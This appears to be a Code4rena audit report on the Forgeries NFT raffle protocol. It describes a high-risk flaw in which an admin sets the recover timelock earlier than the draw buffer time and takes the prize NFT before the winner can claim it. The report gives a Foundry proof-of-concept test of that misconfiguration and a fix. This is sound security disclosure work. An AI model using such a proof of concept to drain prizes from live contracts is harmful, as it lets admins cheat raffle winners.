## [Forgeries Overview](https://code4rena.com/contests/2022-12-forgeries-contest#top)

| Protocol  | Website     | Twitter     | Contest Pot | Length | Time spent |
|-----------|-------------|-------------|-------------|--------|------------|
| Forgeries | [None]() | [None]() | 36,500 USDC | 3 days | < 4 Hours |  

### About Forgeries

A protocol for on-chain games with NFT prizes on Ethereum. We want to raffle away a single NFT (token) based off of another NFT collection (or drawingToken) in a fair and trustless manner.

### Findings Summary

| Risk   | Title                                                                             |
|--------|-----------------------------------------------------------------------------------|
| [H-01] | Admin can withdraw the NFT before the winner timelock ends                        |

## [H-01] Admin can withdraw the NFT before the winner timelock ends

## Impact
The admin could set `recoverTimelock` before `drawBufferTime`, thus he can withdraw the NFT before the winner Draw buffer time ends.

## Proof of Concept

The `drawBufferTime` need to be more then an hour and less then a month and the `recoverTimelock` need to be at least a week, therefore if the admin sets `recoverTimelock` before `drawBufferTime`:

***In the case of a malicious admin:***

- The admin may have the chance to withdraw the NFT before the winner Draw buffer time ends (If the winner didn't claim it in the first week).

***In the case of an honest admin:***

- It will force him to clone a new implementation, which would be a waste of GAS.

In past audits, we have seen contract admins claim that invalidated configuration setters are fine since “admins are trustworthy”. However, cases such as [Nomad](https://twitter.com/samczsun/status/1554260106107179010) got drained for over $150M and Misconfiguration in the [Acala stablecoin](https://web3isgoinggreat.com/single/misconfiguration-in-the-acala-stablecoin-project-allows-attacker-to-steal-1-2-billion-ausd) project allows attacker to steal 1.2 billion aUSD have shown again and again that even trustable entities can make mistakes. Thus any fields that might potentially result in insolvency of protocol should be thoroughly checked.

***This is simple test that shows how the admin could withdraw the NFT before the winner:***

```solidity
function test_WithdrawBeforeUser() public {
        address winner = address(0x1337);
        vm.label(winner, "winner");
        address attacker = address(0x1577);
        vm.label(attacker, "attacker");

        vm.startPrank(winner);
        for (uint256 tokensCount = 0; tokensCount < 10; tokensCount++) {
            drawingNFT.mint();
        }
        vm.stopPrank();

        vm.startPrank(admin);
        targetNFT.mint();

        address consumerAddress = factory.makeNewDraw(
            IVRFNFTRandomDraw.Settings({
                token: address(targetNFT),
                tokenId: 0,
                drawingToken: address(drawingNFT),
                drawingTokenStartId: 0,
                drawingTokenEndId: 10,
                drawBufferTime: 2 weeks,
                recoverTimelock: 1 weeks + 1 seconds,
                keyHash: bytes32(
                    0x79d3d8832d904592c0bf9818b621522c988bb8b0c05cdc3b15aea1b6e8db0c15
                ),
                subscriptionId: subscriptionId
            })
        );
        vm.label(consumerAddress, "drawing instance");

        mockCoordinator.addConsumer(subscriptionId, consumerAddress);
        mockCoordinator.fundSubscription(subscriptionId, 100 ether);

        VRFNFTRandomDraw drawing = VRFNFTRandomDraw(consumerAddress);

        targetNFT.setApprovalForAll(consumerAddress, true);

        uint256 drawingId = drawing.startDraw();

        mockCoordinator.fulfillRandomWords(drawingId, consumerAddress);

        vm.stopPrank();

        assertEq(targetNFT.balanceOf(admin), 0);
        assertEq(targetNFT.balanceOf(winner), 0);
        assertEq(targetNFT.balanceOf(consumerAddress), 1);

        vm.warp(1 weeks + 1 seconds);

        vm.prank(admin);
        drawing.lastResortTimelockOwnerClaimNFT();

        assertEq(targetNFT.balanceOf(admin), 1);
        assertEq(targetNFT.balanceOf(consumerAddress), 0);
        assertEq(targetNFT.balanceOf(winner), 0);

        vm.prank(winner);
        vm.expectRevert("ERC721: transfer from incorrect owner");
        drawing.winnerClaimNFT();

        assertEq(targetNFT.balanceOf(admin), 1);
        assertEq(targetNFT.balanceOf(winner), 0);
        assertEq(targetNFT.balanceOf(consumerAddress), 0);
    }
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

***Add this check in the [`initialize()`]() function te prevent `recoverTimelock` from being set before `drawBufferTime`:***

```solidity
if (_settings.recoverTimelock < _settings.drawBufferTime) {
    revert RECOVER_TIMELOCK_NEEDS_TO_BE_MORE_THEN_REDRAW_TIMELOCK();
}
```
